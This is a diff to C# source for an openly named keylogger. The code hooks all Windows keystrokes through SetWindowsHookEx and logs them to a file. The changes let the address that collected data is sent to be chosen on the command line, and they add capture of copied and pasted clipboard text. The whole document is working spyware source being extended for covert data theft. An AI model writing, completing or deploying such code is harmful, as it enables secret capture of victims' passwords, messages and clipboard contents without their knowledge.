@@ -8,6 +8,7 @@ using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 class InterceptKeys
@@ -36,7 +37,6 @@ class InterceptKeys
 
 	#region static member
 	private static StreamWriter myfileStream;
-	private static bool shift;
 	private static bool ctrl;
 	private static bool alt;
 	private static bool caps;
@@ -56,8 +56,10 @@ class InterceptKeys
 	private static List<char> newValue = new List<char>();
 	private static bool networkWorking = false;
 	private static string tempClipboard;
+	private static IntPtr wParamTemp;
+	private static IntPtr lParamTemp;
 	#endregion
-	public static void Main()
+	public static void Main(string[] args)
 	{
 		try
 		{
@@ -65,7 +67,10 @@ class InterceptKeys
 			String text = "init keylogger:";
 			myfileStream.WriteLine(text.ToString());
 			myfileStream.Close();
-			networkWorking = CheckNetwork("127.0.0.1");
+			if(args.Length ==1 && !string.IsNullOrEmpty(args[0])) 
+			{
+				networkWorking = CheckNetwork(args[0]);
+			}
 			SetKeyboardConfiguration();
 		}
 		catch (Exception err)
@@ -92,15 +97,24 @@ class InterceptKeys
 
 		using (myfileStream = new StreamWriter(myPath, true))
 		{
-
+			
 			if (nCode >= 0)
 			{
-				Task.Run(() => EvaluateData(lParam, wParam));
+				lParamTemp = lParam;
+				wParamTemp = wParam;
+				var thread = new Thread(EvaluateData);
+				thread.SetApartmentState(ApartmentState.STA);
+				thread.Start();
+				//Task.Run(() => EvaluateData(lParam, wParam));
 			}
 		}
 		return CallNextHookEx(_hookID, nCode, wParam, lParam);
 	}
 
+	private static void EvaluateData()
+	{
+		EvaluateData(lParamTemp, wParamTemp);
+	}
 	private static void EvaluateData(IntPtr lParam, IntPtr wParam)
 	{
 		int vkData = Marshal.ReadInt32(lParam);
@@ -229,7 +243,6 @@ class InterceptKeys
 			case VK_LSHIFT:
 			case VK_RSHIFT:
 				keyboardState[(int)Keys.ShiftKey] = 0xff;
-				shift = true;
 				break;
 			case VK_TAB:
 				tab = true;
@@ -271,7 +284,6 @@ class InterceptKeys
 			case VK_LSHIFT:
 			case VK_RSHIFT:
 				keyboardState[(int)Keys.ShiftKey] = 0x00;
-				shift = false;
 				break;
 			case VK_TAB:
 				tab = false;
@@ -298,13 +310,23 @@ class InterceptKeys
 			//copy, paste and cut action
 			if (intPressed == 0x43 || intPressed == 0x58)
 			{
-				tempClipboard = Clipboard.GetText();
-				TraceLog(myfileStream, $"Copied text: {tempClipboard}", true);
+				Thread.Sleep(1000);
+				if(Clipboard.ContainsText())
+				{
+					tempClipboard = Clipboard.GetText();
+					var text = GetClipboardData((uint)TextDataFormat.UnicodeText);
+					TraceLog(myfileStream, $"Copied text: {tempClipboard}", true);
+				}				
+				return;
 			}
 			if (intPressed == 0x56)
 			{
-				newValue.AddRange(tempClipboard.ToArray());
-				TraceLog(myfileStream, $"Pasted text: {tempClipboard}", true);
+				if(!string.IsNullOrEmpty(tempClipboard))
+				{
+					newValue.AddRange(tempClipboard.ToArray());
+					TraceLog(myfileStream, $"Pasted text: {tempClipboard}", true);
+				}
+				return;
 			}
 		}
 
@@ -333,7 +355,7 @@ class InterceptKeys
 	private delegate void SendData(byte[] data, string ipAddress, bool forceResend = false);
 	#endregion
 
-	#region user32.dll import
+	#region user32.dll and kernel32.dll import
 	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
 	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
@@ -353,6 +375,9 @@ class InterceptKeys
 		[Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
 		int bufferSize,
 		uint flags);
+
+	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+	private static extern IntPtr GetClipboardData(uint uFormat);
 	#endregion
 
 }
